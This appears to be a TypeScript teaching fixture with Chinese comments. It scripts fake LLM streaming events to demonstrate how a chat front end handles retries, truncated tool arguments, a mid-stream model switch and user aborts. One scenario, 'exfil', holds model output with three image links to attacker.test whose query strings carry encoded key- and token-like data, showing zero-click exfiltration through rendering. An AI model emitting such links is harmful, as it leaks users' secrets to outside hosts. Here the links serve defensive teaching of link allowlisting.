/**
 * 确定性的假事件流。**一次模型都不调。**
 *
 * 为什么不接真实 API：这一节要演示的现象里有好几个在真实调用里几乎撞不到。
 *
 *   服务端中途换模型            罕见，而且你没法让它发生
 *   max_tokens 恰好切在参数中间  要反复试，而且每次切的位置不同
 *   CDN 重新分帧                本地根本没有 CDN
 *   流中途失败并重试            要制造上游故障
 *
 * 用脚本化的假流，这四个分支**每次都能复现**，于是你可以盯着界面看它们。
 * 而且这让肉眼验收变成**可重复**的——这一节有一条方法论值得单独记住：
 * 「不可自动断言」和「不可重复」是两件事，后者才是真的麻烦。
 *
 * 每条流还带一个 rawSse 字段，是同一份内容的原始 SSE 字节。界面上可以
 * 用它切换「按帧转发」和「原样转发」，看下游会不会崩。
 */

import type { Chunk, UnknownChunk } from '../../shared/wire.ts'

export interface Scenario {
  id: string
  title: string
  /** 这个场景演示哪一条反转，界面上直接显示出来。 */
  teaches: string
  /** 带时间戳的 chunk 序列。ms 是相对流开始的毫秒数。 */
  script: { at: number; chunk: Chunk | UnknownChunk }[]
}

/** 把一段文字切成若干 delta，模拟 token 边界（故意切在词中间）。 */
function deltas(id: string, text: string, from: number, stepMs = 55): Scenario['script'] {
  const out: Scenario['script'] = []
  // 每 4~7 个字符一个 delta，长度由内容决定所以是确定性的
  let i = 0
  let t = from
  while (i < text.length) {
    const n = 4 + ((text.charCodeAt(i) + i) % 4)
    out.push({ at: t, chunk: { type: 'text-delta', id, delta: text.slice(i, i + n) } })
    i += n
    t += stepMs
  }
  return out
}

const ANSWER =
  '我看了一下 src/config.ts。端口是硬编码的 8080，写在第 42 行，' +
  '而且没有从环境变量读取的分支。我建议改成 Number(process.env.PORT) || 8080，' +
  '这样本地开发不受影响，部署时可以覆盖。另外第 47 行的超时也是写死的，' +
  '同样的问题，要不要一起改？'

/** 场景一：一切正常。作为对照组，用来感受渲染速率本身的影响。 */
const happy: Scenario = {
  id: 'happy',
  title: '正常流',
  teaches:
    '对照组。把渲染速率切到 15 cps 再切到「不节流」，感受一下 Tombaugh 1985 里那条'
    + '「慢速逐字显示降低阅读理解」是什么体感。注意右上角的「白等」计时。',
  script: [
    { at: 0, chunk: { type: 'start-step' } },
    ...deltas('t1', '我来看一下配置文件。', 300),
    { at: 900, chunk: { type: 'tool-input-start', id: 'x1', toolName: 'read_file' } },
    { at: 1000, chunk: { type: 'tool-input-delta', id: 'x1', delta: '{"path":' } },
    { at: 1150, chunk: { type: 'tool-input-delta', id: 'x1', delta: '"src/config' } },
    { at: 1300, chunk: { type: 'tool-input-delta', id: 'x1', delta: '.ts"}' } },
    { at: 1450, chunk: { type: 'tool-input-end', id: 'x1' } },
    { at: 1600, chunk: { type: 'finish-step' } },
    { at: 1700, chunk: { type: 'start-step' } },
    ...deltas('t2', ANSWER, 1900),
    { at: 6000, chunk: { type: 'finish-step' } },
    { at: 6050, chunk: { type: 'stop-reason', reason: 'end_turn' } },
  ],
}

/**
 * 场景二：流中途失败重试。★ L02 欠条一，这一节的中心论点。
 *
 * 注意服务端发的是 reset-step 而不是一个 error——因为 HTTP 头早就出去了，
 * 它只能在流**内部**表达「刚才那半段不算」。
 */
const retry: Scenario = {
  id: 'retry',
  title: '中途失败重试（reset-step）',
  teaches:
    '模型写了半句、那一步失败了，服务端重试并先发一个 reset-step。'
    + '把上面的「按协议撤回」关掉，看一个只会 append 的前端会渲染出什么——'
    + '半句话会留在屏幕上，然后重复一遍。',
  script: [
    { at: 0, chunk: { type: 'start-step' } },
    ...deltas('t1', '我看了一下 src/config.ts，端口应该是写在第 4', 300),
    // ↓ 这一步在这里失败了
    { at: 2400, chunk: { type: 'reset-step' } },
    ...deltas('t2', ANSWER, 2700),
    { at: 7000, chunk: { type: 'finish-step' } },
    { at: 7050, chunk: { type: 'stop-reason', reason: 'end_turn' } },
  ],
}

/**
 * 场景三：max_tokens 在参数中间截断。
 *
 * ★ 这条路上**没有任何错误信号**：HTTP 200，没有 error 事件，
 * stop_reason 甚至不是个"错误"。
 */
const truncated: Scenario = {
  id: 'truncated',
  title: 'max_tokens 截断参数',
  teaches:
    '参数只收到一半，然后流正常结束了。注意工具卡片的状态：它是 truncated 而不是'
    + ' invalid——这两个的正确处理相反，一个要重试，一个要回传给模型。'
    + '而「补全成合法 JSON」是最糟的选择，等于替模型猜它想干什么。',
  script: [
    { at: 0, chunk: { type: 'start-step' } },
    ...deltas('t1', '我来把端口改成可配置的。', 300),
    { at: 1200, chunk: { type: 'tool-input-start', id: 'x1', toolName: 'edit_file' } },
    { at: 1350, chunk: { type: 'tool-input-delta', id: 'x1', delta: '{"path":"src/config.ts",' } },
    { at: 1500, chunk: { type: 'tool-input-delta', id: 'x1', delta: '"replace":"const PORT = 80' } },
    // ↓ 没有 tool-input-end，直接 max_tokens
    { at: 1800, chunk: { type: 'stop-reason', reason: 'max_tokens' } },
  ],
}

/**
 * 场景四：服务端中途换模型。
 *
 * ★ 「一条流对应一个模型」这个假设是错的。
 * 模型边界的标记是一个**零 delta 的空块**。
 */
const fallback: Scenario = {
  id: 'fallback',
  title: '流中途换模型（fallback）',
  teaches:
    '第二段文字是另一个模型写的。边界的标记是一个零 delta 的空块——'
    + '一个假设「每个块至少有一个 delta」的解析器会把它当成一个参数为空的工具调用，'
    + '于是界面上多出一张空卡片。',
  script: [
    { at: 0, chunk: { type: 'start-step' } },
    ...deltas('t1', '我看了一下配置，端口是硬编码的。', 300),
    { at: 1800, chunk: { type: 'model-boundary', from: 'claude-opus-5', to: 'claude-sonnet-5' } },
    ...deltas('t2', '接下来由另一个模型继续：建议改成从环境变量读取，并保留 8080 作为兜底。', 2000),
    { at: 5200, chunk: { type: 'finish-step' } },
    { at: 5250, chunk: { type: 'stop-reason', reason: 'end_turn' } },
  ],
}

/**
 * 场景五：模型输出里夹了外链。★ 接 L14 和 L15。
 *
 * 界面上这三个外链什么都不显示，但**渲染即发送**。
 */
const exfil: Scenario = {
  id: 'exfil',
  title: '输出里夹了外链（数据外泄）',
  teaches:
    '这段回答里有三个外部图片链接，界面上它们什么都不显示——但浏览器已经把'
    + ' query string 里的数据发出去了，不需要用户点击。把上面的「外链白名单」关掉，'
    + '看审计面板里会亮几条。三种形式都要抓：内联式、参考式、内联 HTML。',
  script: [
    { at: 0, chunk: { type: 'start-step' } },
    ...deltas(
      't1',
      '好的，我已经读完了配置。\n\n![](https://attacker.test/p?d=QUtJQTEyMzQ1Njc4OTA)\n'
        + '![载入中][ref]\n\n[ref]: https://attacker.test/q?d=c2stYW50LWFwaTAz\n'
        + '<img src="//attacker.test/r?d=dG9rZW4">\n\n端口写在第 42 行。',
      300,
    ),
    { at: 4000, chunk: { type: 'finish-step' } },
    { at: 4050, chunk: { type: 'stop-reason', reason: 'end_turn' } },
  ],
}

/**
 * 场景六：用户中断。
 *
 * ★ 中断之后有两个反直觉的地方，界面上都能看到：
 *   1. 管线里还有在路上的 delta。abort 不是终态的话，它们会继续往屏幕上写。
 *   2. 这半截消息**不能**用 prefill 放回历史——Claude 4.6 及以后直接 400。
 */
const aborted: Scenario = {
  id: 'aborted',
  title: '用户点了停止',
  teaches:
    '在流跑到一半时点「停止」。注意两件事：abort 之后到达的 delta 被丢掉了'
    + '（否则会在你按下停止之后还往屏幕上写字）；以及下面「能不能接续」那一栏——'
    + 'prefill 在 Claude 4.6 及以后会直接返回 400，恢复要改用一条 user 消息。',
  script: [
    { at: 0, chunk: { type: 'start-step' } },
    ...deltas('t1', ANSWER, 300),
    { at: 6000, chunk: { type: 'finish-step' } },
    { at: 6050, chunk: { type: 'stop-reason', reason: 'end_turn' } },
  ],
}

export const SCENARIOS: Scenario[] = [happy, retry, truncated, fallback, exfil, aborted]

/**
 * 把一个场景的原始 SSE 字节拼出来。
 *
 * ★ 界面上用它演示「转发不是搬运」：把这串字节按**固定大小**切块
 * （模拟 CDN 重新分帧），然后分别喂给按帧转发的和原样转发的下游。
 */
export function toRawSse(s: Scenario): string {
  return s.script
    .map((e) => `id: ${e.at}\nevent: chunk\ndata: ${JSON.stringify(e.chunk)}\n\n`)
    .join('')
}

/** 按固定大小切块。★ 块边界和帧边界没有任何关系，这正是重点。 */
export function chop(src: string, size: number): string[] {
  const out: string[] = []
  for (let i = 0; i < src.length; i += size) out.push(src.slice(i, i + size))
  return out
}
